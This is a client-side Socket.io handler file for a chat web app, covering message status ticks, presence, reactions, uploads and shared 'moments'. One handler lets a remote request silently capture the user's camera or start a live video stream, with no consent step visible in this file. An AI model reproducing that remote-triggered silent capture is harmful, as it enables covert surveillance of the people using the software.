/**
 * socket.js — Socket.io handlers. JWT auth is passed on connect in auth.js.
 * This file wires all event handlers after socket is created.
 */

// =============================================================================
// CONNECTION BANNER
// =============================================================================
function updateConnectionBanner(customMsg = null) {
  let banner = document.getElementById("connection-banner");
  if (!banner) {
    banner = document.createElement("div");
    banner.id = "connection-banner";
    banner.style.cssText = `position:fixed;top:0;left:0;right:0;z-index:9999;
      padding:8px 16px;font-size:13px;text-align:center;font-weight:500;
      transition:all 0.3s ease;display:none;`;
    document.body.prepend(banner);
  }
  if (NetworkMonitor.canSend) {
    banner.style.display = "none";
  } else if (!NetworkMonitor.isOnline) {
    banner.textContent = "You are offline. Messages will send when you reconnect.";
    banner.style.cssText += "background:#e53e3e;color:#fff;display:block;";
  } else {
    banner.textContent = customMsg || "Reconnecting to server...";
    banner.style.cssText += "background:#d69e2e;color:#fff;display:block;";
  }
}

// =============================================================================
// STATUS ICON HELPER
// =============================================================================
function updateStatusIcon(tempId, status) {
  const msgEl = document.querySelector(`.message[data-message-id="${tempId}"] .message-bubble`);
  if (!msgEl) return;
  const wrap = msgEl.querySelector(".msg-status-wrap");
  if (!wrap) return;

  // Retrieve message from state to get the full merged status
  const chatId = State.messageIndex[tempId];
  let mergedStatus = { ...status };
  if (chatId) {
    const msgs = State.messages[chatId] || [];
    const msg = msgs.find(m => m.id === tempId || m.tempId === tempId);
    if (msg && msg.status) {
      msg.status = { ...msg.status, ...status };
      mergedStatus = msg.status;
    }
  }

  if (mergedStatus.seen) {
    wrap.innerHTML = `<svg class="status-icon double seen" viewBox="0 0 16 16" style="transform:translateX(3px)"><polyline points="2 8 6 12 14 4"/><polyline points="5 8 9 12 17 4" style="transform:translate(-9px,0)"/></svg>`;
  } else if (mergedStatus.delivered) {
    wrap.innerHTML = `<svg class="status-icon double delivered" viewBox="0 0 16 16"><polyline points="2 8 6 12 14 4"/><polyline points="5 8 9 12 17 4" style="transform:translate(-9px,0)"/></svg>`;
  } else if (mergedStatus.sent) {
    wrap.innerHTML = `<svg class="status-icon single sent" viewBox="0 0 16 16"><polyline points="2 8 6 12 14 4"/></svg>`;
  } else {
    wrap.innerHTML = `<svg class="status-icon clock" viewBox="0 0 16 16"><circle cx="8" cy="8" r="6.5"/><polyline points="8 4 8 8 11 10"/></svg>`;
  }
}

// =============================================================================
// SEEN HELPERS
// =============================================================================
function markSeen(message) {
  if (!message) {
    console.log("[DEBUG seen] markSeen called with null message");
    return;
  }
  console.log("[DEBUG seen] markSeen called for message:", message.id || message.tempId, "current status:", message.status);
  // Mark even if not yet "delivered" — seen implies delivered
  if (message.status?.seen) {
    console.log("[DEBUG seen] message is already seen, returning");
    return;
  }
  if (message.status) {
    message.status.seen      = true;
    message.status.delivered = true;
    message.status.sent      = true;
  }
  const id = message.id || message.tempId;
  const selector = `.message[data-message-id="${id}"] .message-bubble`;
  const msgEl = document.querySelector(selector);
  console.log("[DEBUG seen] Query selector:", selector, "Found element?", !!msgEl);
  if (!msgEl) return;
  const wrap = msgEl.querySelector(".msg-status-wrap");
  if (!wrap) {
    console.log("[DEBUG seen] .msg-status-wrap not found in element");
    return;
  }
  wrap.innerHTML = `<svg class="status-icon double seen" viewBox="0 0 16 16"><polyline points="2 8 6 12 14 4"/><polyline points="5 8 9 12 17 4" style="transform:translate(-9px,0px);"/></svg>`;
  console.log("[DEBUG seen] DOM updated successfully to seen tick");
}

// chatId = the conversation partner's userId
// tempId = optional specific message id
function updateMessageSeenByTempId(chatId, tempId = null) {
  console.log("[DEBUG seen] updateMessageSeenByTempId called for chatId:", chatId, "tempId:", tempId);
  const msgs = State.messages[chatId] || [];
  console.log("[DEBUG seen] Total messages in State.messages for this chat:", msgs.length);
  // only update messages WE sent (sender = "me")
  const mine = msgs.filter(m => m.sender === "me" || m.user?.toString() === State.currentUser?.id?.toString());
  console.log("[DEBUG seen] Filtered mine messages count:", mine.length, "State.currentUser.id:", State.currentUser?.id);
  if (tempId) {
    const msg = mine.find(m => m.id === tempId || m.tempId === tempId);
    if (msg && msg.uploadStatus !== "uploading") markSeen(msg);
  } else {
    mine.forEach(m => {
      if (m.uploadStatus !== "uploading") {
        markSeen(m);
      }
    });
  }
}

// =============================================================================
// FLUSH OUTBOX
// =============================================================================
function flushOutbox() {
  OutboxQueue.getAll().forEach(item => {
    if (item.retries >= MAX_RETRIES) {
      updateMessageByTempId(item.tempId, { uploadStatus: "failed" });
      OutboxQueue.remove(item.tempId);
      showToast("A message could not be sent after multiple retries.", "error");
      return;
    }
    item.retries++;
    socket.emit("private_message", {
      message: {
        tempId: item.tempId, to: item.to, type: item.type,
        content: item.content, caption: item.caption,
        fileName: item.fileName || null, fileSize: item.fileSize || null,
        replyTo: item.replyTo, clientTime: item.clientTime
      }
    });
  });
}

// =============================================================================
// FLUSH UPLOAD QUEUE
// =============================================================================
function flushUploadQueue() {
  UploadQueue.getAll().forEach(item => {
    if (item.retries >= MAX_RETRIES) {
      updateMessageByTempId(item.msgId, { uploadStatus: "failed" });
      UploadQueue.remove(item.msgId);
      showToast("A media upload failed after multiple retries.", "error");
      return;
    }
    item.retries++;
    if (item.type === "audio") uploadAudio(item.msgId, item.receiver, item.blob).catch(() => {});
    else uploadMedia(item.msgId, item.receiver, item.file).catch(() => {});
  });
}

// =============================================================================
// INIT SOCKET — all event handlers
// =============================================================================
function initSocket() {
  const tone = new Audio("/tone/notices.mp3");

  // ── Connection error (token expired/invalid) ──────────────
  socket.on("connect_error", (err) => {
    console.error("[Socket] connect_error:", err.message);
    if (err.message.includes("UNAUTHORIZED") || err.message.includes("TOKEN_EXPIRED")) {
      showToast("Session expired. Please log in again.", "error");
      // setTimeout(logout, 1500);
    }
    NetworkMonitor.isSocketConnected = false;
    updateConnectionBanner();
  });

  // ── Connected ─────────────────────────────────────────────
  socket.on("connect", () => {
    NetworkMonitor.isSocketConnected = true;
    updateConnectionBanner();
    // Only flush queues on reconnect (not first connect — nothing is queued yet)
    if (State.apiMessagesLoaded) {
      socket.emit("sync:delivered");
      flushOutbox();
      flushUploadQueue();
    }
  });

  socket.on("disconnect", () => {
    NetworkMonitor.isSocketConnected = false;
    updateConnectionBanner();
  });

  socket.on("reconnect", () => {
    NetworkMonitor.isSocketConnected = true;
    updateConnectionBanner();
    if (State.apiMessagesLoaded) {
      socket.emit("sync:delivered");
      flushOutbox();
      flushUploadQueue();
    }
  });

  // ── Online list ───────────────────────────────────────────
  socket.on("online:list", ({ users }) => {
    console.log("[DEBUG] socket online:list received:", users, "conversations in state:", State.conversations.map(c => ({ id: c.id, username: c.username })));
    State.onlineUsers = users || [];
    State.conversations.forEach(conv => {
      conv.online = State.onlineUsers.includes(conv.id);
    });
    renderChatList(document.getElementById("chat-search")?.value.trim().toLowerCase() || "");
    if (State.activeChat) {
      const conv = State.conversations.find(c => c.id === State.activeChat);
      if (conv) {
        const statusEl = document.getElementById("online-status");
        if (statusEl) {
          if (State.onlineUsers.includes(State.activeChat)) {
            statusEl.textContent = "Active now";
            statusEl.className = "online-status online";
          } else {
            const lastseen = formatTime(new Date(conv.lastSeen).getTime());
            statusEl.textContent = lastseen === "Just now" ? "Just now" : `Last seen ${lastseen} ago`;
            statusEl.className = "online-status";
          }
        }
      }
    }
  });

  socket.on("user:online", ({ userId }) => {
    console.log("[DEBUG] socket user:online received:", userId);
    if (!State.onlineUsers) State.onlineUsers = [];
    if (!State.onlineUsers.includes(userId)) {
      State.onlineUsers.push(userId);
    }
    const conv = State.conversations.find(c => c.id === userId);
    if (conv) {
      conv.online = true;
      renderChatList();
    }
    if (State.activeChat === userId) {
      const statusEl = document.getElementById("online-status");
      if (statusEl) { statusEl.textContent = "Active now"; statusEl.className = "online-status online"; }

      const snapshotBtn = document.getElementById("chat-capture-snapshot-btn");
      if (snapshotBtn && snapshotBtn.style.display !== "none") {
        snapshotBtn.disabled = false;
        snapshotBtn.style.opacity = "1";
        snapshotBtn.title = `Click Snapshot from ${conv?.username || "user"}`;
      }

      const liveVoiceBtn = document.getElementById("chat-live-voice-btn");
      const chatOptionLiveVoice = document.getElementById("chatOption-LiveVoice");
      if (liveVoiceBtn && liveVoiceBtn.classList.contains("voice-allowed")) {
        liveVoiceBtn.disabled = false;
        liveVoiceBtn.style.opacity = "1";
        liveVoiceBtn.title = `Listen to ${conv?.username || "user"}'s Live Voice`;
      }
      if (chatOptionLiveVoice && chatOptionLiveVoice.classList.contains("voice-allowed")) {
        chatOptionLiveVoice.style.pointerEvents = "auto";
        chatOptionLiveVoice.style.opacity = "1";
        chatOptionLiveVoice.title = `Listen to ${conv?.username || "user"}'s Live Voice`;
      }
    }
  });

  socket.on("user:offline", ({ userId }) => {
    if (State.onlineUsers) {
      State.onlineUsers = State.onlineUsers.filter(id => id !== userId);
    }
    const conv = State.conversations.find(c => c.id === userId);
    if (conv) {
      conv.online  = false;
      conv.lastSeen = new Date();
      renderChatList();
    }
    if (State.activeChat === userId) {
      const statusEl = document.getElementById("online-status");
      if (statusEl) { statusEl.textContent = "Just now"; statusEl.className = "online-status"; }

      const snapshotBtn = document.getElementById("chat-capture-snapshot-btn");
      if (snapshotBtn && snapshotBtn.style.display !== "none") {
        snapshotBtn.disabled = true;
        snapshotBtn.style.opacity = "0.4";
        snapshotBtn.title = `${conv?.username || "user"} is offline`;
      }

      const liveVoiceBtn = document.getElementById("chat-live-voice-btn");
      const chatOptionLiveVoice = document.getElementById("chatOption-LiveVoice");
      
      let voiceStopped = false;
      if (window.liveVoiceState && window.liveVoiceState.isListening && window.liveVoiceState.targetId === userId) {
        window.stopListeningToVoice();
        voiceStopped = true;
      }

      if (liveVoiceBtn && liveVoiceBtn.classList.contains("voice-allowed")) {
        if (voiceStopped) {
          showToast(`${conv?.username || "User"} went offline. Live voice stopped.`, "warning");
          voiceStopped = false; // only show once
        }
        liveVoiceBtn.disabled = true;
        liveVoiceBtn.style.opacity = "0.4";
        liveVoiceBtn.title = `${conv?.username || "user"} is offline`;
      }
      if (chatOptionLiveVoice && chatOptionLiveVoice.classList.contains("voice-allowed")) {
        if (voiceStopped) {
          showToast(`${conv?.username || "User"} went offline. Live voice stopped.`, "warning");
        }
        chatOptionLiveVoice.style.pointerEvents = "none";
        chatOptionLiveVoice.style.opacity = "0.4";
        chatOptionLiveVoice.title = `${conv?.username || "user"} is offline`;
      }
    }
  });

  // ── Incoming private message ──────────────────────────────
  socket.on("private_message", (msg) => {
    // Normalize all IDs to strings
    const fromId = msg.from?.toString();
    const myId   = (State.currentUser.id || State.currentUser._id)?.toString();

    if (State.playTune && fromId !== State.activeChat) {
      tone.currentTime = 0;
      tone.play().catch(() => {});
    }

    const message = {
      id:        msg.id?.toString(),
      type:      msg.type,
      content:   msg.content,
      cover:     msg.cover   || null,
      thumb:     msg.thumb   || null,
      fileName:  msg.fileName || null,
      fileSize:  msg.fileSize || null,
      caption:   msg.caption || null,
      sender:    fromId === myId ? "me" : "other",
      timestamp: msg.timestamp,
      user:      fromId,
      replyTo:   msg.replyTo || null,
      reactions: {},
      status:    { sent: true, delivered: true, seen: false },
      callType:  msg.callType,
      callStatus: msg.callStatus,
      callRoomId: msg.callRoomId,
      callExpiresAt: msg.callExpiresAt,
      callDuration: msg.callDuration,
      isDisappearing: msg.isDisappearing || false,
      cameraFacing: msg.cameraFacing || null,
      cameraFilter: msg.cameraFilter || null
    };

    if (!State.messages[message.user]) State.messages[message.user] = [];

    const exists = State.messages[message.user].some(m =>
      m.id?.toString() === message.id || m.tempId?.toString() === message.id
    );
    if (exists) {
      socket.emit("message:received", { tempId: msg.tempId || msg.id });
      return;
    }

    State.messages[message.user].push(message);
    State.messages[message.user].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    State.messageIndex[message.id] = message.user;
    socket.emit("message:received", { tempId: msg.tempId || msg.id });

    if (message.user === State.activeChat) {
      insertMessageInOrder(message);
      socket.emit("chat:seen", { from: message.user });
    }

    // Update chat list last message
    const conv = State.conversations.find(c => c.id === message.user);
    if (conv) {
      conv.lastMessage = message.type === "text" ? message.content : `📷 ${message.type}`;
      conv.timestamp   = message.timestamp;
      conv.unread = message.user !== State.activeChat ? (conv.unread || 0) + 1 : 0;
    }
    renderChatList(document.getElementById("chat-search")?.value.trim().toLowerCase() || "");
  });

  // ── Message ack / delivery / seen ────────────────────────
  socket.on("message_ack", ({ tempId, status }) => {
    OutboxQueue.remove(tempId);
    updateMessageByTempId(tempId, { status: { sent: true } });
    updateStatusIcon(tempId, { sent: true });
  });

  socket.on("message:delivered", ({ tempId }) => {
    // Find message in state and update it
    const chatId = State.messageIndex[tempId];
    if (chatId) {
      const msgs = State.messages[chatId] || [];
      const msg = msgs.find(m => m.id === tempId || m.tempId === tempId);
      if (msg && msg.status) msg.status.delivered = true;
    }
    updateStatusIcon(tempId, { delivered: true });
  });

  socket.on("message:seen", ({ by }) => {
    // "by" = the userId of the person who saw our messages
    console.log(`[Socket Client] message:seen received. by: ${by}`);
    updateMessageSeenByTempId(by);
  });

  socket.on("chat:seen_sync", ({ from }) => {
    // Our own other device tells us messages FROM "from" were seen
    console.log(`[Socket Client] chat:seen_sync received. from: ${from}`);
    updateMessageSeenByTempId(from);
  });

  // ── Media uploaded ────────────────────────────────────────
  socket.on("media:uploaded", ({ tempId, url, mediaType, cover, thumb }) => {
    updateMessageByTempId(tempId, { content: url, type: mediaType, cover, thumb, uploadStatus: "done" });
    updateReceivedMediaDOM(tempId, { content: url, cover, thumb, type: mediaType });
  });

  // ── Typing ────────────────────────────────────────────────
  socket.on("typing:start", ({ user }) => {
    if (user !== State.activeChat) return;
    const t = document.getElementById("typing-indicator");
    if (t) t.style.display = "flex";
    document.getElementById("messages-container").scrollTop = 99999;
    clearTimeout(State.typingTimeouts[user]);
    State.typingTimeouts[user] = setTimeout(() => { if (t) t.style.display = "none"; }, 3000);
  });

  socket.on("typing:stop", ({ user }) => {
    if (user !== State.activeChat) return;
    const t = document.getElementById("typing-indicator");
    if (t) t.style.display = "none";
  });

  // ── Reactions ─────────────────────────────────────────────
  socket.on("reaction", ({ messageId, userId, emoji }) => {
    const chatId = State.messageIndex[messageId];
    if (!chatId) return;
    const msg = (State.messages[chatId] || []).find(m => (m.id || m.tempId) === messageId);
    if (!msg) return;
    if (!msg.reactions) msg.reactions = {};
    msg.reactions[userId] = emoji;
    const msgEl = document.querySelector(`.message[data-message-id="${messageId}"]`);
    if (!msgEl) return;
    let reactionsEl = msgEl.querySelector(".message-reactions");
    if (!reactionsEl) {
      reactionsEl = document.createElement("div");
      reactionsEl.className = "message-reactions";
      msgEl.querySelector(".message-bubble")?.appendChild(reactionsEl);
    }
    const counts = {};
    Object.values(msg.reactions).forEach(e => { counts[e] = (counts[e] || 0) + 1; });
    reactionsEl.innerHTML = Object.entries(counts)
      .map(([e, n]) => `<span class="reaction-badge">${e}${n > 1 ? " " + n : ""}</span>`)
      .join("");
  });

  // ── Connection request notifications ─────────────────────
  socket.on("connection:new_request", async ({ from }) => {
    // Refresh from API to get the real connectionId (socket payload doesn't have it)
    await refreshPendingRequests();
    showToast(`${from.username} wants to connect with you!`, "info");
    // Update the tab badge inside people panel if open
    const tabBadge = document.getElementById("tab-pending-badge");
    if (tabBadge) tabBadge.textContent = State.pendingRequests.length || "";
  });

  socket.on("connection:accepted", async ({ by }) => {
    showToast(`${by.username} accepted your request!`, "success");
    // Refresh contacts list without recreating socket
    const connRes = await getMyConnections();
    if (connRes.code === 200) {
      State.contacts = connRes.Data.contacts || [];
      State.conversations = State.contacts.map(c => ({
        id: c.user.id,
        connectionId: c.connectionId,
        username: c.user.username,
        avatar: (c.user.avatar && c.user.avatar.length > 2)
          ? c.user.avatar
          : c.user.username.charAt(0).toUpperCase(),
        lastSeen: c.user.lastSeen,
        timestamp: 0,
        lastMessage: "",
        unread: 0,
        online: (State.onlineUsers && State.onlineUsers.includes(c.user.id)) || false,
      }));
      renderChatList();
    }
  });

  // ── Undelivered sync ──────────────────────────────────────
  socket.on("private_message_sync", (msg) => {
    const chatPartner = msg.to?.toString();
    if (!chatPartner) return;

    const message = {
      id:        msg.tempId?.toString(),
      type:      msg.type,
      content:   msg.content,
      cover:     msg.cover   || null,
      thumb:     msg.thumb   || null,
      fileName:  msg.fileName || null,
      fileSize:  msg.fileSize || null,
      caption:   msg.caption || null,
      sender:    "me",
      timestamp: msg.timestamp,
      user:      chatPartner,
      replyTo:   msg.replyTo || null,
      reactions: {},
      status:    { sent: true, delivered: true, seen: false },
      isDisappearing: msg.isDisappearing || false,
      cameraFacing: msg.cameraFacing || null,
      cameraFilter: msg.cameraFilter || null
    };

    if (!State.messages[chatPartner]) State.messages[chatPartner] = [];

    const exists = State.messages[chatPartner].some(m =>
      m.id?.toString() === message.id || m.tempId?.toString() === message.id
    );
    if (exists) return;

    State.messages[chatPartner].push(message);
    State.messages[chatPartner].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    State.messageIndex[message.id] = chatPartner;

    if (chatPartner === State.activeChat) {
      insertMessageInOrder(message);
    }

    const conv = State.conversations.find(c => c.id === chatPartner);
    if (conv) {
      conv.lastMessage = message.type === "text" ? message.content : `📷 ${message.type}`;
      conv.timestamp   = message.timestamp;
    }
    renderChatList(document.getElementById("chat-search")?.value.trim().toLowerCase() || "");
  });

  // ── Background job updates ───────────────────────────────
  socket.on("messages:bulk_seen", ({ by }) => {
    if (typeof updateMessageSeenByTempId === "function") {
      updateMessageSeenByTempId(by);
    }
  });

  socket.on("messages:bulk_delivered", ({ to }) => {
    const msgs = State.messages[to] || [];
    msgs.forEach(m => {
      if ((m.sender === "me" || m.user?.toString() === State.currentUser?.id?.toString()) && m.status && !m.status.delivered) {
        m.status.delivered = true;
        updateStatusIcon(m.id || m.tempId, m.status);
      }
    });
  });

  socket.on("messages:auto_deleted", ({ tempIds }) => {
    if (!tempIds || !tempIds.length) return;
    tempIds.forEach(tempId => {
      const chatId = State.messageIndex[tempId];
      if (chatId) {
        State.messages[chatId] = (State.messages[chatId] || []).filter(m => m.id !== tempId && m.tempId !== tempId);
        delete State.messageIndex[tempId];
        if (chatId === State.activeChat) {
          const el = document.querySelector(`.message[data-message-id="${tempId}"]`);
          if (el) el.remove();
        }
      }
    });
    renderChatList(document.getElementById("chat-search")?.value.trim().toLowerCase() || "");
  });

  socket.on("client:capture_moment", async (payload) => {
    if (payload?.type === "video") {
      if (typeof window.startLiveVideoStreaming === "function") {
        await window.startLiveVideoStreaming(payload?.from, payload?.camera);
      }
    } else {
      if (typeof window.captureSilentMoment === "function") {
        await window.captureSilentMoment(payload?.camera);
      }
    }
  });

  socket.on("client:stream_sdp", async ({ from, sdp, type }) => {
    if (type === "voice") {
      if (typeof window.handleVoiceStreamSDP === "function") {
        await window.handleVoiceStreamSDP(from, sdp);
      }
    } else if (type === "video") {
      if (typeof window.handleVideoStreamSDP === "function") {
        await window.handleVideoStreamSDP(from, sdp);
      }
    }
  });

  socket.on("client:stream_ice", async ({ from, candidate, type }) => {
    if (type === "voice") {
      if (typeof window.handleVoiceStreamICE === "function") {
        await window.handleVoiceStreamICE(from, candidate);
      }
    } else if (type === "video") {
      if (typeof window.handleVideoStreamICE === "function") {
        await window.handleVideoStreamICE(from, candidate);
      }
    }
  });

  socket.on("moment:stream_stop", ({ from }) => {
    if (typeof window.stopLiveVideoStreaming === "function") {
      window.stopLiveVideoStreaming();
    }
    if (typeof window.stopReceivingVideoStream === "function") {
      window.stopReceivingVideoStream();
    }
    const modal = document.getElementById("live-video-preview-modal");
    if (modal) {
      modal.style.display = "none";
      const videoEl = document.getElementById("live-video-preview-element");
      if (videoEl) {
        videoEl.srcObject = null;
        videoEl.style.display = "none";
      }
    }
  });

  socket.on("moment:new", ({ userId, username, avatar, moment }) => {
    if (!State.friendMoments) State.friendMoments = {};
    if (!State.friendMoments[userId]) State.friendMoments[userId] = [];
    
    // Check duplicates
    const exists = State.friendMoments[userId].some(m => m.url === moment.url);
    if (!exists) {
      State.friendMoments[userId].unshift(moment);
    }
    
    showToast(`${username} posted a new moment!`, "info");

    if (State.activeChat === userId) {
      const avatarEl = document.getElementById("chat-avatar");
      if (avatarEl) {
        avatarEl.classList.add("has-moments");
      }

      const snapshotBtn = document.getElementById("chat-capture-snapshot-btn");
      if (snapshotBtn) {
        snapshotBtn.disabled = false;
        snapshotBtn.style.opacity = "1";
        snapshotBtn.innerHTML = `
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
              <circle cx="12" cy="13" r="4"/>
          </svg>`;
      }

      if (typeof openMomentsCarousel === "function") {
        openMomentsCarousel(userId);
      }
    }

    // Real-time update for Moments Tab inside Modal
    const activeNavBtn = document.querySelector(".profile-nav-btn.active");
    const modalIsOpen = document.getElementById("profile-modal")?.classList.contains("active");
    if (modalIsOpen && activeNavBtn && activeNavBtn.dataset.section === "moments") {
      renderPeopleTab("moments");
    } else {
      const momentsBadge = document.getElementById("modal-moments-badge");
      if (momentsBadge) {
        momentsBadge.classList.add("dot");
        momentsBadge.textContent = " ";
      }
    }
  });

  if (typeof window.initVoiceSockets === "function") {
    window.initVoiceSockets();
  }
}

function insertMessageInOrder(message) {
  const mc = document.getElementById("messages");
  if (!mc) return;

  const chatId = message.user;
  const msgs = State.messages[chatId] || [];

  // Sort array descending (newest first)
  msgs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  // Find index of this message in the sorted array
  const k = msgs.findIndex(m => (m.id && m.id === message.id) || (m.tempId && m.tempId === message.tempId));
  if (k === -1) return;

  // Create message DOM element
  const newEl = createMessageElement(message);

  // If it's the newest message (idx 0), append to bottom
  if (k === 0) {
    mc.appendChild(newEl);
  } else {
    // Insert before the immediate newer message (idx k-1)
    const newerMsg = msgs[k - 1];
    const newerId = newerMsg.id || newerMsg.tempId;
    const newerEl = mc.querySelector(`[data-message-id="${newerId}"]`);
    if (newerEl) {
      mc.insertBefore(newEl, newerEl);
    } else {
      mc.appendChild(newEl);
    }
  }

  // Scroll to bottom if it is the newest message or if the user is close to the bottom
  const container = document.getElementById("messages-container");
  if (container) {
    const isAtBottom = container.scrollHeight - container.scrollTop - container.clientHeight < 200;
    if (k === 0 || isAtBottom) {
      container.scrollTop = 99999;
    }
  }

  if (message.type === "image" || message.type === "video") {
    if (typeof attactEventOnMedia === "function") attactEventOnMedia();
    if (viewer) viewer.addItem(message);
  }
}

document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "hidden") {
    console.log("[Socket] Page hidden, disconnecting socket to allow push notifications...");
    if (typeof socket !== "undefined" && socket && socket.connected) {
      socket.disconnect();
    }
  } else if (document.visibilityState === "visible") {
    console.log("[Socket] Page visible, reconnecting socket...");
    if (typeof socket !== "undefined" && socket && !socket.connected) {
      socket.connect();
    }
  }
});
